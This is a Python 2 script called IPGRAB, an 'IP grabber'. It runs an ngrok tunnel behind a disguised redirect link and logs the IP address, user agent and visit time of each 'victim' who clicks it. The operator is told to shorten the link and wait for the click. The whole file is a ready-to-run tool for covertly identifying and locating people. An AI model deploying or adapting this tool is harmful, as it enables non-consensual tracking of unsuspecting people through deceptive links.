#By Luiz P. Viana
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import SocketServer
import time
import os
import requests
import re
from string import replace
from threading import Thread
import platform

def redirect():
    class MyHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write("<head><meta http-equiv='refresh' content='0; URL=" + url + "'></head>")

        def log_message(self, format, *args):
            return

    httpd = SocketServer.TCPServer(("", port), MyHandler)
    httpd.serve_forever()

def logip():
    global iplist,countr
    c = 0
    r = requests.get('http://localhost:4040/api/requests/http').json()
    log = open("logip.txt","a+")
    for i in r['requests']:
        if r['requests'][c]['request']['headers']['X-Forwarded-For'][0] not in iplist:
            ip = r['requests'][c]['request']['headers']['X-Forwarded-For'][0]
            iplist.append(ip)
            useragent = r['requests'][c]['request']['headers']['User-Agent'][0]
            date = r['requests'][c]['start']
            info = "[ - ] REQUEST ID: " + str(countr) + "\n" + "[ + ] Date: " + date + '\n' + "[ + ] IP ADDRESS: " + ip + '\n' + "[ + ] User Agent: " + useragent + "\n"
            print info
            log.write(info)
            log.close()
            countr += 1
        c += 1


def verifyconnection():
    global save
    while True:
        r = requests.get("http://127.0.0.1:4040/api/tunnels/command_line%20(http)").json()
        count = r['metrics']['conns']['count']
        if count > save:
            save = count
            logip()

def startngrok():
    try:
        sys = platform.system()
        if sys == "Windows":
            os.system("start ngrok http "  + str(port) + " --authtoken " + auth)
        elif sys == "Linux":
            os.system("sudo ./ngrok http " + str(port) + " --authtoken " + auth + " > /dev/null &")
        else:
            print("[ # ] IPGRAB is not yet avaible for this platform. [ # ]")
            exit()
        print "[ ... ] Starting ngrok [ ... ] \n"
        time.sleep(3)
        r = requests.get('http://127.0.0.1:4040/api/tunnels').json()
        url = r['tunnels'][0]['public_url']
        if "https://" in url:
           url = replace(url,"https://","http://")
        print "[ $ ] Use this url: " + url + " [ you can shorten it ;) ]\n"
        print "[ ! ] Waiting for the click [ ? ]\n"
    except:
        print "[ # ] Something is wrong, probaly the authtoken. ;-;"

def banner():
    ban = ("  ___ ____   ____ ____      _    ____\n \
|_ _|  _ \ / ___|  _ \    / \  | __ )\n \
 | || |_) | |  _| |_) |  / _ \ |  _ \ \n \
 | ||  __/| |_| |  _ <  / ___ \| |_) |\n \
|___|_|    \____|_| \_\/_/   \_\____/\n Python IP-grabber with ngrok - By Luiz Viana \n \t\t| github.com/luizviana |\n\n")
    print ban

def options():
    global url
    global auth
    print "Hey, this program needs ngrok to work, sign up at https://ngrok.com/ and copy your authtoken at https://dashboard.ngrok.com/auth. \nSet a url to redirect de victim. (example https://twitter.com/)\n"

    auth = raw_input("[ + ] NGROK authtoken --> ")
    while True:
        url = raw_input("[ + ] URL to redirect --> ")
        if not re.findall('https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', url):
            print "[ ? ] Bad format ;-; (example http://example.com)"
        else:
            print "[ ! ] The link will redirect to " + url + "\n"
            break


port = 666 #port of ngrok tunneling
save = 0 #count connections
countr = 1 #count request
ngrok = 0 #verify ngrok
url = '' #url to redirect
iplist = [] #list of knowns IPs

banner()
options()
startngrok()
webserv = Thread(target=redirect)
webserv.start()
verifyconnection()
